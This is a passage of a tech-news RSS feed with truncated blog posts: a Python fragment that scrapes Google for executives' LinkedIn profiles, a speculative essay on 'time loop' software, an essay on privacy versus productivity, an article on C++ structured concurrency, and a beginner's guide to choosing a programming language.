            result_lis = soup.select(".g a[ping]")
            href_lis = []
            for result in result_lis:
                href = result['href']
                if '//webcache.googleusercontent.com/search' in href:
                    continue
                if 'https://translate.google.com/translate' in href:
                    continue
                href_lis += [href]
            return href_lis
        except:
            traceback.print_exc()
            continue
    raise Exception


async def find_people_in_roles(coy_name: str, li_coy_profile_url: str = None) -&gt; List[str]:
    MAX_WORKERS = 10
    ROLES = ['ceo',
             'cto',
             'coo',
             'vp engineering'
             ]

    def does_role_match(role: str, person_profile: Dict) -&gt; bool:
        for exp in person_profile['experiences']:
            if not (exp['ends_at'] is None and util.is_string_similar(coy_name, exp['company'])):
                continue

            if not util.is_string_similar(role, exp['title']):
                continue

            return True
        return False

    async def search_li_profile(role: str) -&gt; List[str]:
        url_result_lis = await google_search_async(f"linkedin.com/in {role} {coy_name}", retry_count=RETRY_COUNT)
        profile_url_lis = list(filter(lambda x: 'linkedin.com/in' in x,
                                      url_result_lis))
        return (role, profile_url_lis)

    print("Performing google search for Linkedin profiles")
    tasks = [search_li_profile(role) for role in ROLES]
    search_results = await asyncio.gather(*tasks)

    profile_url_lis = []
    for _, profile_lis in search_results:
        for profile_url in profile_lis:
            if profile_url not in profile_url_lis:
                profile_url_lis += [profile_url]
    print(f"Total of {len(profile_url_lis)} profiles to query")

    profile_dic = {}
    working_lis = []
    for idx, profile_url in enumerate(profile_url_lis):
        working_lis += [profile_url]

        if (idx &gt; 0 and len(working_lis) &gt; 0 and idx % MAX_WORKERS == 0) or idx == (len(profile_url_lis) - 1):
            print(f"Working on {len(working_lis)} profiles..")
            tasks = …</code></pre></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nubela.co/blog/send-personalized-emails-to-decision-makers-scrape-linkedin-company-profile/">https://nubela.co/blog/send-personalized-emails-to-decision-makers-scrape-linkedin-company-profile/</a></em></p>]]>
            </description>
            <link>https://nubela.co/blog/send-personalized-emails-to-decision-makers-scrape-linkedin-company-profile/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25032865</guid>
            <pubDate>Mon, 09 Nov 2020 09:12:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Time Loop Software (2013)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25032563">thread link</a>) | @netgusto
<br/>
November 9, 2020 | https://marak.com/blog/2013-05-13-time-loop-software | <a href="https://web.archive.org/web/*/https://marak.com/blog/2013-05-13-time-loop-software">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
<p>What if it were possible to write software capable of time travel? What if we could write software that was able to retrieve results from a computation solved sometime in the near future? What would this software look like? What problems could be solved?</p>
<p><a href="https://en.wikipedia.org/wiki/Novikov_self-consistency_principle#Time_loop_logic">Time loop logic</a> is a hypothetical system of computation that exploits the <a href="https://en.wikipedia.org/wiki/Novikov_self-consistency_principle">Novikov self-consistency principle</a>. In this system the computer is able to send the result of a computation backwards through time and rely upon the self-consistency principle to force the sent result to be correct. This futuristic concept might seem impossible now but I'd imagine trying to explain nuclear fission to a 3rd century blacksmith would seem equally impossible.</p>
<h2 id="writing-time-loop-software">Writing time loop software</h2>
<p>Building on the concept of time loop logic we are able to implement theoretical programming constructs to help better understand the concept of time travel in software. In the following examples we demonstrate what a time loop logic program might look like.</p>
<h3 id="an-event-loop">An event loop</h3>
<p>In the follow examples we'll be using the JavaScript programing language. JavaScript provides a single thread of execution for code to run in. The JavaScript virtual machine is constantly running an event loop. Each tick of this event loop represents a single cycle of code execution. Once this cycle is completed the next tick in the event loop will occur. In the popular <a href="https://nodejs.org/">Node.js</a> framework <a href="https://nodejs.org/api/process.html#process_process_nexttick_callback">an API is provided</a> to defer the execution of a block of code until the nextTick of the event loop occurs.</p>
<h4 id="node-js-process-nexttick-example">node.js process.nextTick() example</h4>
<pre><code><span><span>function</span> <span>foo</span>(<span></span>) </span>{
  <span>console</span>.log(<span>'foo'</span>);
}

process.nextTick(foo);
<span>console</span>.log(<span>'bar'</span>);
</code></pre><p>This will output:</p>
<pre><code><span>bar
</span><span>foo</span>
</code></pre><p>The same effect of <code>process.nextTick</code> can also be achieved using JavaScript's setTimeout command</p>
<pre><code>setTimeout<span>(<span>foo</span>, <span>0</span>)</span>
</code></pre><h4 id="node-js-process-prevtick-example">node.js process.prevTick() example</h4>
<p>Now let's imagine that instead of deferring a line of code until the next tick of the event loop we could instead push that code <em>backwards</em> to the <em>previous</em> tick of the event loop.</p>
<pre><code><span><span>function</span> <span>foo</span>(<span></span>) </span>{
  <span>console</span>.log(<span>'foo'</span>);
}

<span>console</span>.log(<span>'bar'</span>);
process.prevTick(foo);
</code></pre><p>Outputs:</p>
<pre><code><span>foo</span>
bar
</code></pre><p>The same effect of <code>process.prevTick</code> can also be achieved using setTimeout with a negative value</p>
<pre><code>setTimeout<span>(<span>foo</span>, <span>-1</span>)</span>
</code></pre><p>Since all we are doing is logging a simple string to the console, this is a contrived example. However; building on the concept of <code>process.prevTick</code> we can begin to implement more complex time loop programs.</p>
<h2 id="brute-force-cracking-with-time-loops">Brute force cracking with time loops</h2>
<p>Let's assume a simple <a href="https://en.wikipedia.org/wiki/Brute-force_search">brute-force search</a> password cracking scenario. Imagine there is a login function which expects a password. We have access to a very large word dictionary in which our cracking software will sequentially attempt logins using every word in the dictionary as a password until a match is found.</p>
<p>Here is the code for our brute-force program</p>
<p><em>Note: It's important to remember that Novikov's self-consistency principle guarantees that the sequence of events generating the paradox in the following code has zero probability.</em></p>


<h2 id="prime-factors-with-time-loops">Prime Factors with time loops</h2>
<p>Using time-loop logic  prime factors can be calculated in polynomial time.</p>


<h2 id="zero-lag-instant-communication">Zero-lag / Instant Communication</h2>
<p>The theoretical application of time-loop logic is endless. Imagine a time-loop based communication protocol. This would mean zero millisecond latency. Imagine gaming, video broadcasting, and file sharing with instantaneous transfer and zero lag. Through exploiting self-consistency we know that data will be sent in the immediate future ( since the data has begun transferring from the source ) and that eventually the transmission will arrive at it's destination. As long as the data will eventually be received, we are able to send the result back from the future into the immediate present, removing the notion of latency or lag.</p>
<h2 id="time-loop-logic-and-novikov-s-self-consistency-principle">Time Loop Logic and Novikov's Self-Consistency Principle</h2>
<p>How is it actually possible to program a time loop? Based on the self-consistency principle and continuing advancements in quantum entanglement these types of mind-bending constructs are not very far away. It's very possible we'll see this type of software actively being developed within the next hundred years.</p>
<p>Time loop logic was first written about by <a href="https://en.wikipedia.org/wiki/Hans_Moravec">Hans Moravec</a> who is best known for his work in robotics and artificial intelligence at Carnegie Mellon University. You can find Hans' original paper from 1991, "Time Travel and Computing", here: <a href="https://frc.ri.cmu.edu/~hpm/project.archive/general.articles/1991/TempComp.html">https://frc.ri.cmu.edu/~hpm/project.archive/general.articles/1991/TempComp.html</a>. I recommend reading the entire paper.</p>
<p>What we know from <a href="https://en.wikipedia.org/wiki/Closed_timelike_curve#General_relativity">general relativity</a> is that at a quantum level backwards time-travel is mathematically possible in certain solutions containing <a href="https://en.wikipedia.org/wiki/Closed_timelike_curve">closed timelike curves</a>. A closed timelike curve is a <a href="https://en.wikipedia.org/wiki/World_line">world-line</a> in a <a href="https://en.wikipedia.org/wiki/Lorentzian_manifold#Lorentzian_manifold">Lorentzian manifold</a>. </p>
<p>Closed timelike curves ( CTCs ) pose a problem for physicists. The existence of CTCs introduces the notion of time travel being possible. If time travel is possible, we have now introduced the notion of <a href="https://en.wikipedia.org/wiki/Grandfather_paradox">time travel paradoxes</a> which can violate <a href="https://en.wikipedia.org/wiki/Causality_(physics)">causality</a>. Since it's generally accepted that we cannot violate causality in our universe we must be able to explain how closed time-like curves can exist.</p>
<p>In his self-consistency principle Novikov asserts that if an event exists that would give rise to a paradox, or to any "change" to the past whatsoever, then the probability of that event is zero. In short, it says that it is impossible to create time travel paradoxes. You can find the original paper here: <a href="http://authors.library.caltech.edu/3737">http://authors.library.caltech.edu/3737</a>. I recommend starting with reading the <a href="https://en.wikipedia.org/wiki/Novikov_self-consistency_principle#History_of_the_principle">history of the principle</a>.</p>

<p>In order for time loop logic to return an answer instantaneously, we <em>must</em> ensure that the problem will run long enough into the future to <em>actually</em> calculate the result. If a problem takes sixty seconds to solve, the program must run for at least sixty seconds. Time-loop logic does <em>not</em> violate causality. We are able to retrieve the answer instantly because we have committed to spending sixty seconds in the future calculating the answer and sending it back.</p>
<p>This turns debugging time-loop logic into somewhat of an impossibility. Any bugs in a time loop indicate that sometime in the future a problem has occurred. <strong>This event may or may not be related to software.</strong> </p>
<p>Imagine a computer that utilized a time loop to brute force crack passwords ( as our code posted above did). I turn the machine on and request it cracks the password. The program doesn't work. Frustrated, I turn off the machine and complain to my co-worker Josh.</p>
<p>Josh turns on the machine and requests the password. The software works instantly cracking the password in under 1ms.</p>
<p>Bewildered, I ask Josh why the machine worked for him but not for me.</p>
<p>Josh replies, "It's actually quite simple. Using that computer it's going to take approximately 400 hours to brute force the password. After that 400 hours the CPU must recursively return the cracked password back in time until it reaches right now. I was able to get the answer instantly because I have decided to not turn this computer off for another 399 hours and 59 minutes. Simply put, you turned off the computer too quickly"</p>
<p><em>The consequences of unplugging the computer</em></p>
</div></div></div>]]>
            </description>
            <link>https://marak.com/blog/2013-05-13-time-loop-software</link>
            <guid isPermaLink="false">hacker-news-small-sites-25032563</guid>
            <pubDate>Mon, 09 Nov 2020 08:27:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Productivity vs. Privacy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25032481">thread link</a>) | @jessems
<br/>
November 9, 2020 | https://jessems.com/productivity-vs-privacy | <a href="https://web.archive.org/web/*/https://jessems.com/productivity-vs-privacy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>In recent years there's been a steady growth in privacy focused companies. Some examples that have reached large-scale adoption are <a href="https://protonmail.com/">ProtonMail</a>, <a href="https://signal.com/">Signal</a>, and <a href="https://duckduckgo.com/">DuckDuckGo</a>. These are companies that have put privacy front and center to their value proposition and can be considered <em>privacy-preserving products</em>.</p><p>What these services have in common is that they promise their users a higher degree of privacy relative to their competitors. Instead of the usual encryption in transit (protection from eavesdroppers) and encryption at rest (protection against unauthorized users), services like Signal and ProtonMail enable their users to hide data from anyone except the intended recipient, which — crucially — includes the service providers themselves.</p><p>This category of encryption is known as end-to-end encryption (e2e) and has been vital for anyone whose safety depends on the privacy of their communication (e.g. human rights activists and journalists).</p><p>The canonical implementation of e2e for email is known as Pretty Good Privacy (PGP) and its reference implementation is GPG. GPG never reached mass adoption and there seems to be a myriad of reasons for that. The most overarching reason, however, seems to be that it continues to be difficult to use. As the founder of Signal, Moxie Marlinspike <a href="https://moxie.org/2015/02/24/gpg-and-me.html">explains</a>, the spirit behind GPG had been the following:</p><blockquote><p>Instead of developing opinionated software with a simple interface, GPG was written to be as powerful and flexible as possible.</p></blockquote><p>Powerful, flexible software written by nerds, unfortunately also tends to be prohibitively complex for normal users. Combined with the fact that <a href="https://signal.org/blog/the-ecosystem-is-moving/">decentralized technology seems unable to quickly adapt to change</a>, the result has been a clunky solution that has, quite frankly, stayed clunky. With no feasible privacy-preserving alternative <!-- -->[1]<!-- -->, non-privacy preserving email providers became the norm.</p><p>One such email provider, Gmail by Google, started off by scanning your emails to serve you personalized ads. Although they've stopped personalizing ads based on your emails, they're using email content to serve you a better experience across their services. Similarly, Facebook tracks what you do so as to shape your experience and keep you glued to their platform.</p><p>What unites these platforms, is described by Professor Shoshana Zuboff as “<a href="https://en.wikipedia.org/wiki/Surveillance_capitalism">surveillance capitalism</a>”. The business model of surveillance capitalist companies is to harvest personal data about you to build a model that predicts your behavior. These prediction models are packaged and sold as advertisement opportunities to companies eager to buy your attention. The incentive of surveillance capitalists is to harvest your data so they can keep you on the platform and get you to interact with ads. You might be the user, but you're not the customer.</p><p>It should come as no surprise then, that none of these platforms has shipped with end-to-end encryption by default. Doing so would go against the incentives that undergird their very business model. Their ability to predict your behavior, and sell ads based on those predictions, hinges on their ability to harvest your data.</p><p>Selling your data as a predictive model is not the only incentive that exists for collecting your data. Usage data also helps inform product improvements. These improvements typically make the experience even more compelling <!-- -->[2]<!-- -->.</p><p>A company like Google has other business models of course. Google Workspace, aimed at businesses, is a collection of collaboration and productivity tools. This ranges from Google Docs, to chat, to video conferencing, and more. By making this a paid service, Google introduces a different incentive for itself. The customer and the user are now one and the same.</p><p>Even in the case of the user being the customer, user data is still being harvested. This data might not feed into personalized ads (because that’s no longer the primary business model) but it might feed into making the experience better. But what does “better” mean in the business environment?</p><p>Better is often equated with being more productive and in economics productivity is thought of as the ratio between outputs (e.g. GDP for a country, or unit outputs for a business) and its inputs (hours worked). It's a blunt, but useful tool for thinking about how much is produced per hour of work invested.</p><p>We can think about the productivity of a business by considering a company’s profits and its salaries as outputs and the hours worked by its employees as the inputs. Using these quantities we can arrive at a measure that captures a business’ productivity. We would expect both national productivity and business productivity to increase with advances in technology.</p><p>How does technology lead to increases in productivity? One obvious way is by making us more efficient. If some new technology saves us time doing a certain task, all other things being equal, we’ll end up seeing those gains in our outputs (corporate profits and salaries).</p><p>What exactly are the things that increase efficiency for the tasks that we do? In many ways, in the realm of knowledge work, we don't always know before the gains are made. We are still discovering ways in which we can be more productive and especially so in the ways in which collaboration can be improved. A illustrative example of how productivity gains are discovered comes from Kevin A. Kwok's description of Figma's road to success.</p><p>In "Why Figma Wins", <a href="https://kwokchain.com/2020/06/19/why-figma-wins/">Kwok details</a> how the product team discovered a way to enable more efficient collaboration in the design process. That this was possible wasn't obvious to even those within the scene. While Sketch had broken new ground with their vector based design tool geared towards product designers, Figma took it to another level by taking many of the same (dare I say revolutionary) UX patterns and offering them in a web-native, multiplayer web application.</p><blockquote><p>The core insight of Figma is that design is larger than just designers. Design is all of the conversations between designers and PMs about what to build. It is the mocks and prototypes and the feedback on them. It is the handoff of specs and assets to engineers and how easy it is for them to implement them.</p></blockquote><p>As Kevin explains, Figma brought together the disparate disciplines that are involved in a design process into a synced browser window for everybody. This helped democratize design and remove a lot of friction that had existed before.</p><p>Not only did Figma push the frontier of productivity into new territory, it wasn’t obvious beforehand what that territory would look like. The lesson is that productivity improvements are won through a process of <em>discovery</em>. Kevin explains:</p><blockquote><p>As disciplines evolve, they figure out the social norms needed to operate better, build tools that can be shared across the industry, and invent abstractions that allow offloading more and more of the workload. They learn how to collaborate better, not just with each other but with all the other functions as well.</p></blockquote><p>What <em>is</em> obvious are the relentless improvements that continue to be made in the direction of increased productivity and that the big tech platforms aren’t shying away from investing heavily in innovation (discovery) in that direction.</p><p>One strategy that software companies — especially ones with a lot of resources - are bringing to bear on the challenge of unlocking greater productivity is the harvesting of user data. They  turn the data into insights which informs and enables new features as well as improves existing features.</p><p>The seeking of productivity gains through the harvesting of user data is a path not available to privacy-preserving products. The user data isn't readable to them — and that's the whole point.</p><p>This creates a trade-off from the user's perspective. Whatever your particular motivation might be, as soon as you opt for a privacy-preserving service you're opting for a service that is not able to read your data, and by extension, not able to harvest it. Because the harvesting of data is what is driving many of the improvements in productivity, in choosing to preserve user privacy, these services are forgoing their ability to provide additional gains in productivity.</p><p>Historically, as we saw with the origins of GPG, there has always been additional friction involved in replicating a workflow in a privacy-preserving manner. Although using e2e services such as Signal and ProtonMail has become nearly frictionless, they lack many features their non-privacy preserving counterparts offer.</p><p>If you compare the productivity gains between privacy-preserving and non-preserving products from the perspective of the user, it's hard not to arrive at the conclusion that there’s a gap between the two — and it appears to be growing.</p><p>There is perhaps no better example of a feature which hinges on the ability to read user data than search. Although ProtonMail is reminiscent of Gmail in many ways, one area where it falls short is the absence of any ability to  search the contents of your emails. Search only works if the provider of such functionality can scan and index your content. It works even better if the provider is able to harvest search queries and use those to build predictive models (e.g. autocomplete and smart suggestions). These are features which make Gmail users more productive but aren't available to ProtonMail users <!-- -->[3]<!-- -->.</p><p>The absence of search might not be a dealbreaker for a journalist wanting only to communicate securely with a source. But it is just one example of an ever growing list of productivity improvements that are happening on the side of non-privacy preserving products which cannot be mirrored on the side of the privacy preserving ones.</p><p>Some UX patterns which enable higher degrees of productivity, once discovered by non-privacy preserving products, can be copied relatively easily by their privacy-preserving counterparts. ProtonMail's UX is reminiscent of Gmail, Signal's UX is reminiscent of WhatsApp, DuckDuckGo's UX is reminiscent of Google.</p><p>But there are other features and patterns that, …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jessems.com/productivity-vs-privacy">https://jessems.com/productivity-vs-privacy</a></em></p>]]>
            </description>
            <link>https://jessems.com/productivity-vs-privacy</link>
            <guid isPermaLink="false">hacker-news-small-sites-25032481</guid>
            <pubDate>Mon, 09 Nov 2020 08:13:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Structured Concurrency]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25032133">thread link</a>) | @ingve
<br/>
November 8, 2020 | https://ericniebler.com/2020/11/08/structured-concurrency/ | <a href="https://web.archive.org/web/*/https://ericniebler.com/2020/11/08/structured-concurrency/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>TL;DR: <strong>“Structured concurrency” refers to a way to structure async computations so that child operations are guaranteed to complete before their parents, just the way a function is guaranteed to complete before its caller.</strong> This sounds simple and boring, but in C++ it’s anything but. Structured concurrency — most notably, C++20 coroutines — has profound implications for the correctness and the simplicity of async architecture. It brings the <a href="https://docs.microsoft.com/en-us/cpp/cpp/welcome-back-to-cpp-modern-cpp?view=msvc-160">Modern C++ style</a> to our async programs by making async lifetimes correspond to ordinary C++ lexical scopes, eliminating the need for reference counting to manage object lifetime.</p>
<h2>Structured Programming and C++</h2>
<p>Back in the 1950’s, the nascent computing industry discovered structured programming: that high-level programming languages with lexical scopes, control structures, and subroutines resulted in programs that were far easier to read, write, and maintain than programming at the assembly level with test-and-jump instructions and <code>goto</code>. The advance was such a quantum leap that nobody talks about structured programming anymore; it’s just “programming”.</p>
<p>C++, more so than any other language, leverages structured programming to the hilt. The semantics of object lifetime mirror — and are tied to — the strict nesting of scopes; i.e., the <em>structure</em> of your code. Function activations nest, scopes nest, and object lifetimes nest. Objects’ lifetimes end with a scope’s closing curly brace, and objects are destroyed in the reverse order of their construction to preserve the strict nesting.</p>
<p>The Modern C++ programming style is built on this structured foundation. Objects have <em>value semantics</em> — they behave like the ints — and resources are cleaned up in destructors deterministically, which guarantees structurally that resources aren’t used after their lifetimes have ended. This is <em>very</em> important.</p>
<p>When we abandon this strict nesting of scopes and lifetimes — say, when we reference count an object on the heap, or when we use the singleton pattern — we are fighting against the strengths of the language rather than working with them.</p>
<h2>The Trouble With Threads</h2>
<p>Writing correct programs in the presence of concurrency is far more difficult than in single-threaded code. There are lots of reasons for this. One reason is that threads, like singletons and dynamically allocated objects, scoff at your puny nested scopes. Although you can use the Modern C++ style <em>within</em> a thread, when logic and lifetimes are scattered across threads, the hierarchical structure of your program is lost. The tools we use to manage complexity in single-threaded code — in particular, nested lifetimes tied to nested scopes — simply don’t translate to async code.</p>
<p>To see what I mean, let’s look at what happens when we take a simple synchronous function and make it asynchronous.</p>
<pre>void computeResult(State &amp; s);

int doThing() {
  State s;
  computeResult(s);
  return s.result;
}
</pre>
<p><code>doThing()</code> is simple enough. It declares some local state, calls a helper, then returns some result. Now imagine that we want to make both functions async, maybe because they take too long. No problem, let’s use Boost futures, which support continuation chaining:</p>
<pre>boost::future&lt;void&gt; computeResult(State &amp; s);

boost::future&lt;int&gt; doThing() {
  State s;
  auto fut = computeResult(s);
  return fut.then(
    [&amp;](auto&amp;&amp;) { return s.result; }); // OOPS
}
</pre>
<p>If you’ve programmed with futures before, you’re probably screaming, <em>“Nooooo!”</em> The <code>.then()</code> on the last line queues up some work to run after <code>computeResult()</code> completes. <code>doThing()</code> then returns the resulting future. The trouble is, when <code>doThing()</code> returns, the lifetime of the <code>State</code> object ends, <em>and the continuation is still referencing it</em>. That is now a dangling reference, and will likely cause a crash.</p>
<p>What has gone wrong? Futures let us compute with results that aren’t available yet, and the Boost flavor lets us chain continuations. But the continuation is a separate function with a separate scope. We often need to share data across those separate scopes. No more tidy nested scopes, no more nested lifetimes. We have to manage the lifetime of the state manually, something like this:</p>
<pre>boost::future&lt;void&gt;
computeResult(shared_ptr&lt;State&gt; s); // addref
                                    // the state

boost::future&lt;int&gt; doThing() {
  auto s = std::make_shared&lt;State&gt;();
  auto fut = computeResult(s);
  return fut.then(
    [s](auto&amp;&amp;) { return s.result; }); // addref
                                       // the state
}
</pre>
<p>Since both async operations refer to the state, they both need to share responsibility to keep it alive.</p>
<p>Another way to think about this is: <em>what is the lifetime of this asynchronous computation?</em> It starts when <code>doThing()</code> is called, but it doesn’t end until the continuation — the lambda passed to <code>future.then()</code> — returns. <em>There is no lexical scope that corresponds to that lifetime.</em> And that is the source of our woes.</p>
<h2>Unstructured Concurrency</h2>
<p>The story gets more complicated yet when we consider executors. Executors are handles to executions contexts that let you schedule work onto, say, a thread or thread pool. Many codebases have some notion of an executor, and some let you schedule things with a delay or with some other policy. This lets us do cool things, like move a computation from an IO thread pool to a CPU thread pool, or retry an async operation with a delay. Handy, but like <code>goto</code> it is a very low-level control structure that tends to obfuscate rather than clarify.</p>
<p>For instance, I recently came across an algorithm that uses executors and callbacks (called Listeners here) that retries the async allocation of some resource. Below is a greatly abridged version. It is described after the break.</p>
<pre>// This is a continuation that gets invoked when
// the async operation completes:
struct Manager::Listener : ListenerInterface {
  shared_ptr&lt;Manager&gt; manager_;
  executor executor_;
  size_t retriesCount_;

  void onSucceeded() override {
    /* ...yay, allocation succeeded... */
  }
  void onFailed() override {
    // When the allocation fails, post a retry
    // to the executor with a delay
    auto alloc = [manager = manager_]() {
      manager-&gt;allocate();
    };
    // Run "alloc" at some point in the future:
    executor_.execute_after(
      alloc, 10ms * (1 &lt;&lt; retriesCount_));
  }
};

// Try asynchronously allocating some resource
// with the above class as a continuation
void Manager::allocate() {
  // Have we already tried too many times?
  if (retriesCount_ &gt; kMaxRetries) {
    /* ...notify any observers that we failed */
    return;
  }

  // Try once more:
  ++retriesCount_;
  allocator_.doAllocate(
    make_shared&lt;Listener&gt;(
      shared_from_this(),
      executor_,
      retriesCount_));
}
</pre>
<p>The <code>allocate()</code> member function first checks to see if the operation has already been retried too many times. If not it calls a helper <code>doAllocate()</code> function, passing in a callback to be notified on either success or failure. On failure, the handler posts deferred work to the executor, which will call <code>allocate()</code> back, thus retrying the allocation with a delay.</p>
<p>This is a heavily stateful and rather circuitous async algorithm. The logic spans many functions and several objects, and the control and data flow is not obvious. Note the intricate ref-counting dance necessary to keep the objects alive. Posting the work to an executor makes it even harder. Executors in this code have no notion of continuations, so errors that happen during task execution have nowhere to go. The <code>allocate()</code> function can’t signal an error by throwing an exception if it wants any part of the program to be able to recover from the error. Error handling must be done manually and out-of-band. Ditto if we wanted to support cancellation.</p>
<p>This is <strong>unstructured concurrency</strong>: we queue up async operations in an <em>ad hoc</em> fashion; we chain dependent work, use continuations or “strand” executors to enforce sequential consistency; and we use strong and weak reference counts to keep data alive until we are certain it’s no longer needed. There is no formal notion of task A being a child of task B, no way to enforce that child tasks complete before their parents, and no one place in the code that we can point to and say, “Here is the algorithm.”</p>
<blockquote>
<p><strong>If you don’t mind the analogy, the hops through the executor are a bit like <code>goto</code> statements that are non-local in both time and space: “Jump to this point in the program, <em>X</em> milliseconds from now, on this particular thread.”</strong></p>
</blockquote>
<p>That non-local discontinuity makes it hard to reason about correctness and efficiency. Scale unstructured concurrency up to whole programs handling lots of concurrent real-time events, and the incidental complexity of manually handling out-of-band asynchronous control and data flow, controlling concurrent access to shared state, and managing object lifetime becomes overwhelming.</p>
<h2>Structured Concurrency</h2>
<p>Recall that in the early days of computing, unstructured programming styles rapidly gave way to structured styles. With the addition of coroutines to C++, we are seeing a similar phase shift happening today to our asynchronous code. If we were to rewrite the above retry algorithm in terms of coroutines (using Lewis Baker’s popular <a href="https://github.com/lewissbaker/cppcoro">cppcoro</a> library), it might look something like this:</p>
<pre>// Try asynchronously allocating some resource
// with retry:
cppcoro::task&lt;&gt; Manager::allocate() {
  // Retry the allocation up to kMaxRetries
  // times:
  for (int retriesCount = 1;
       retriesCount &lt;= kMaxRetries;
       ++retriesCount) {
    try {
      co_await allocator_.doAllocate();
      co_return; // success!
    } catch (...) {}

    // Oops, it failed. Yield the thread for a
    // bit and then retry:
    co_await scheduler_.schedule_after(
      10ms * (1 &lt;&lt; retriesCount));
  }

  // Error, too many retries
  throw std::runtime_error(
    "Resource allocation retry count exceeded.");
}
</pre>
<blockquote>
<p>Aside: This replaces the <code>executor_</code> with a <code>scheduler_</code> that implements cppcoro’s <a href="https://github.com/lewissbaker/cppcoro#delayedscheduler-concept">DelayedScheduler</a> concept.</p>
</blockquote>
<p>Let’s …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ericniebler.com/2020/11/08/structured-concurrency/">https://ericniebler.com/2020/11/08/structured-concurrency/</a></em></p>]]>
            </description>
            <link>https://ericniebler.com/2020/11/08/structured-concurrency/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25032133</guid>
            <pubDate>Mon, 09 Nov 2020 07:15:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Choose a Programming Language Guide 2021]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25032086">thread link</a>) | @kmhmubin
<br/>
November 8, 2020 | https://mubinsodyssey.com/how-to-choose-a-programming-language-guide-2021 | <a href="https://web.archive.org/web/*/https://mubinsodyssey.com/how-to-choose-a-programming-language-guide-2021">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>With the blessing of the Internet, people can learn anything anytime, anywhere without any hassle. Programming Language is one of the examples. Nowadays, not only students but also general people learn programming language as hobbies or to make a career on it as programming could be fun and buy you a Lamborghini at the same time. No kidding, As of Nov 1, 2020, the average annual pay for a <a target="_blank" href="https://www.ziprecruiter.com/Salaries/Software-Developer-Salary">Software Developer in the United States is $86,523 a year</a>. Don’t worry, and you don’t need talent, just passion; you can earn too.</p>
<p>However, Choosing a programming language is challenging when you’re getting started. Whenever you search about it, they lead to new recommend blogs, articles, or youtube videos, which could be very confusing. It's not only you; almost everyone faces this common problem. Even I was confused when I started my computer engineering degree.</p>
<p><strong>Table of content</strong></p>
<ul>
<li><p><a href="#no-more-confusion">No More Confusion</a></p>
</li>
<li><p><a href="#choose-a-development-field">Choose A Development Field</a></p>
</li>
<li><p><a href="#choose-a-programming-language">Choose A Programming Language</a></p>
</li>
<li><p><a href="#work-on-projects">Work On Projects</a></p>
</li>
<li><p><a href="#what’s-next">What’s Next</a></p>
</li>
</ul>
<p>Don’t worry. This article will help you to pick the best language for what you want to learn and become. To learn without any stress, follow the steps below.</p>
<h2 id="no-more-confusion"><strong>No More Confusion</strong>😕</h2>
<p>Every time you search on google or watch videos, you would be like, WTF??!! So, in short, just to let you know,</p>
<p>Python is king!😎</p>
<p>Java is down!😪</p>
<p>C++ is hard!🤐</p>
<p>Javascript is boss!😎</p>
<p>PHP is no more! 😰</p>
<p><img src="https://media.giphy.com/media/5t9wJjyHAOxvnxcPNk/giphy.gif" alt="confused"></p>
<p>All these languages make you confused?!! Forget what you have read before about this and make your mind and head clear now.</p>

<h2 id="choose-a-development-field"><strong>Choose A Development Field</strong> ⛏️</h2>
<p>Make your mind about which field you want to work with to be less confused. There are many fields such as,</p>
<ul>
<li>Web Development</li>
<li>Mobile App Development</li>
<li>Desktop App Development</li>
<li>Machine Learning</li>
<li>Security (Software / Network)</li>
</ul>
<p>And many more. Just Pick one of them. Let me explain a little bit to understand those fields.</p>
<p>💠 <strong>Web Development</strong> </p>
<p>Web development is the building and maintenance of websites; it’s the work that happens behind the scenes to make a website look great, work fast, and perform well with a seamless user experience.</p>
<p>💠 <strong>Mobile App Development</strong></p>
<p>Mobile app development is creating software intended to run on mobile devices and optimized to take advantage of those products' unique features and hardware.</p>
<p>💠 <strong>Desktop App Development</strong></p>
<p>Desktop Applications are run stand alone on the user’s laptops and systems. The term used for these applications desktop differs from mobile applications, which are in the trend. The key features of desktop applications are the high efficiency of the application, and these are highly customized as per user requirements and flexibility.</p>
<p>💠 <strong>Machine Learning</strong></p>
<p>Machine learning is an application of artificial intelligence (AI) that provides systems the ability to learn and improve from experience without being explicitly programmed automatically. Machine learning focuses on developing computer programs that can access data and use them to learn for themselves.</p>
<p>💠 <strong> Software Security</strong></p>
<p>Software security is an idea implemented to protect software against malicious attacks and other hacker risks so that the software continues to function correctly under such potential risks. Security is necessary to provide integrity, authentication, and availability.</p>
<p>💠 <strong> Network Security</strong></p>
<p>Network security is a broad term that covers a multitude of technologies, devices, and processes. In its simplest term, it is a set of rules and configurations designed to protect the integrity, confidentiality, and accessibility of computer networks and data using both software and hardware technologies.</p>

<h2 id="choose-a-programming-language"><strong>Choose A Programming Language</strong>🛠️</h2>
<p>Choose a language based on the platform. Why, if you ask? It will help you to learn faster, and you can become more productive. Now the main problem, There’s a lot of programming languages. Wikipedia has a list of over <a target="_blank" href="https://en.wikipedia.org/wiki/List_of_programming_languages">700 programming languages</a>.</p>
<p><img src="https://media.giphy.com/media/3o6YglDndxKdCNw7q8/giphy.gif" alt="what"></p>
<p>Wait. WHAT!! 😲</p>
<p>Are you kidding me? How can I choose a programming language over 700 languages?</p>
<p>Hold your horse, man. Don’t worry.</p>
<p>Before that, Check out this gem.</p>
<p><img src="https://i.imgur.com/7iR9fH4.jpg" alt="programmic joke"></p>
